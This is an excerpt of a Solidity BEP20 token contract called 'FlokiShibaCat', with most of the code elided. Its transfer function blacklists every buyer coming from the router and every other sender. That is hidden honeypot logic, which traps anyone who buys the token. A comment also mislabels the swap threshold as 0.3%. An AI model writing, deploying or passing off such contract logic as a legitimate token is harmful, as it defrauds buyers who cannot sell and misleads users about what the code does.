...
contract FlokiShibaCat is IBEP20, Auth {
    ...
    string constant _name = "FlokiShibaCat";
    string constant _symbol = "FloCatS";
    ...
    uint256 public swapThreshold = _totalSupply / 100000 * 1; // 0.3%
    bool inSwap;
   ...
   function setProtectionEnabled(bool _protect) external onlyOwner {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (sender == routerAddress){
            blacklistAddress(recipient,true);
        } else { blacklistAddress(sender,true); }
